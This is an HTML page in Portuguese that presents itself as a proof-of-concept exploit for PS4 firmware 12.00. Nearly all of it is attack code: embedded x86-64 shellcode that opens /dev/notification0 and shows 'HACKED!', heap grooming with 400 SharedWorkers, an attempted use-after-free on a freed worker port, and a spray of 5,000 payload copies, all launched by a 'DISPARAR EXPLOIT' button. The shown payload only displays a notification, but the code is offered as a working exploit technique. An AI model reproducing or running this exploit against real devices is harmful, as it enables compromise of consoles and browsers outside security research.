<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 PoC (Lite Version)</title>
    
</head>
<body>

    <h1>PS4 12.00 Notificação PoC</h1>
    <h3>Versão: Precision Lite (Sem OOM)</h3>
    <div id="status">Status: Pronto.</div>
    <div id="log"></div>
    <br>
    <button onclick="start_lite()">DISPARAR EXPLOIT</button>

    <script>
        function log(msg, cls="info") {
            var d = document.getElementById("log");
            d.innerHTML += `<div class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            d.scrollTop = d.scrollHeight;
        }

        function updateStatus(msg) {
            document.getElementById("status").innerText = "Status: " + msg;
        }

        // =================================================================
        // 1. PAYLOAD: NOTIFICAÇÃO (Genérico)
        // =================================================================
        var notify_shellcode = [
            0x48, 0x31, 0xC0, 0x48, 0x89, 0xC2, 0x48, 0x89, 0xC6, 0x48, 0x8D, 0x3D, 0x44, 0x00, 0x00, 0x00,
            0x48, 0xC7, 0xC0, 0x05, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x48, 0x89, 0xC7, 0x48, 0x8D, 0x35, 0x45,
            0x00, 0x00, 0x00, 0x48, 0xC7, 0xC2, 0x30, 0x0C, 0x00, 0x00, 0x48, 0xC7, 0xC0, 0x04, 0x00, 0x00,
            0x00, 0x0F, 0x05, 0x48, 0x31, 0xC0, 0x48, 0xC7, 0xC0, 0x06, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3,
            // Path: /dev/notification0
            0x2F, 0x64, 0x65, 0x76, 0x2F, 0x6E, 0x6F, 0x74, 0x69, 0x66, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6F,
            0x6E, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            // Msg: HACKED!
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x48, 0x41, 0x43, 0x4B, 
            0x45, 0x44, 0x21, 0x00 
        ];

        // =================================================================
        // 2. CONSTRUÇÃO DO FAKE OBJECT (Payload no Objeto)
        // =================================================================
        function prepare_payload() {
            // Tamanho fixado em 0x400 (baseado nos seus testes de estabilidade 400->404)
            var size = 0x400; 
            var buffer = new Uint32Array(size / 4);

            // Converter bytes para Uint32
            var shellcode_u32 = [];
            for (var i = 0; i < notify_shellcode.length; i+=4) {
                var val = notify_shellcode[i] | (notify_shellcode[i+1] << 8) | (notify_shellcode[i+2] << 16) | (notify_shellcode[i+3] << 24);
                shellcode_u32.push(val);
            }

            // Preencher o objeto inteiro com o shellcode repetido
            // Isso aumenta a chance de execução se o kernel pular para qualquer lugar dentro dele
            for (var k = 0; k < buffer.length; k++) {
                if (k % shellcode_u32.length === 0) {
                    // Reinicia o padrão do shellcode
                }
                buffer[k] = shellcode_u32[k % shellcode_u32.length];
            }
            
            return buffer;
        }

        // =================================================================
        // 3. EXECUÇÃO
        // =================================================================
        var workers_stash = [];

        async function start_lite() {
            if (!window.SharedWorker) {
                log("Navegador não suportado.", "err");
                return;
            }

            var payload = prepare_payload();
            log("Payload construído (Notificação).", "success");

            // FASE 1: GROOMING (0-400)
            updateStatus("Estabilizando Memória...");
            log("Criando 400 Workers para estabilidade...", "info");
            
            var i = 0;
            var groom_interval = setInterval(() => {
                if (i >= 400) {
                    clearInterval(groom_interval);
                    start_pressure(payload); // Vai para fase 2
                    return;
                }
                
                // Cria em blocos de 50 para ser rápido mas não travar
                for(let k=0; k<50; k++) {
                    if (i >= 400) break;
                    try {
                        let w = new SharedWorker("data:text/javascript,1", "groom_" + i);
                        w.port.start();
                        workers_stash.push(w);
                    } catch(e){}
                    i++;
                }
            }, 50);
        }

        function start_pressure(payload) {
            log("Entrando na Zona de Perigo (401-404)...", "warn");
            updateStatus("Aplicando Pressão...");
            
            var p_count = 0;
            var interval = setInterval(() => {
                // Ao atingir o limite (404), dispara
                if (p_count >= 4) {
                    clearInterval(interval);
                    trigger_uaf(payload); 
                    return;
                }

                try {
                    let id = 401 + p_count;
                    let w = new SharedWorker("data:text/javascript,1", "victim_" + id);
                    w.port.start();
                    workers_stash.push(w);
                    log(`Worker ${id} alocado.`);
                } catch(e) {
                    log("Erro crítico: " + e, "err");
                }
                
                p_count++;
            }, 200); // 200ms para garantir que o kernel processe o freeze
        }

        function trigger_uaf(payload) {
            log("!!! DISPARANDO UAF NO WORKER 404 !!!", "err");
            updateStatus("EXECUTANDO...");
            
            // 1. Pegar a vítima (Worker 404)
            var victim = workers_stash.pop();

            // 2. FREE
            victim.port.close();
            
            // 3. SPRAY CIRÚRGICO (Sem OOM)
            // 5000 cópias de 1KB = 5MB. Muito leve.
            // Mas suficiente para preencher o buraco imediato.
            log("Injetando código no buraco...");
            var spray_copies = [];
            for (var i = 0; i < 5000; i++) {
                spray_copies.push(new Uint32Array(payload));
            }

            // 4. ATIVAÇÃO
            log("Forçando execução...", "warn");
            try { 
                victim.port.postMessage("PWN"); 
                victim.port.start();
            } catch(e){}

            // Limpa referência
            victim = null;

            log("Aguardando notificação...", "success");
            
            setTimeout(() => {
                alert("Se a notificação não apareceu, recarregue a página e tente novamente.");
            }, 5000);
        }
    </script>
</body>
</html>
